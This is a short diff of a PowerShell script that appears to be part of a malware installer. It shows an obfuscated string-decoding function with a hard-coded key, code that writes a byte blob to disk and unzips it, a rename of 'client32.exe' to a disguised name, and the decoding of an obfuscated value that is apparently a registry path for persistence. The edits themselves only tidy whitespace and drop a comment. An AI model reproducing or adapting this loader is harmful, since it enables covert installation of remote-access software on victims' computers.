@@ -14,7 +14,7 @@ function oghygb4  {
             }
         }
     })
-       $irugha4 = [System.Text.Encoding]::ascii.GetString($irugha4)   
+       $irugha4 = [System.Text.Encoding]::ascii.GetString($irugha4)
     return $irugha4
 }
 function Install
@@ -30,7 +30,6 @@ Set-Content -Path "$lit" -Value $hi16yox8a -Encoding Byte
  cd $fpath
  add-Type -assembly "System.IO.Compression.Filesystem";
 [IO.Compression.Zipfile]::ExtractToDirectory("$lit", "$fpath");
- #expand-archive "$lit" "./"
  remove-item "$lit"
  rename-item "client32.exe" "$clientname"
 $reg = oghygb4 "Jik2MF07PQ0TERAGHAcpKA4EHA0GCgETMjUcCwMIGREpJhIVHAcbETECHBEcCgk7PBcb" "z47gha"
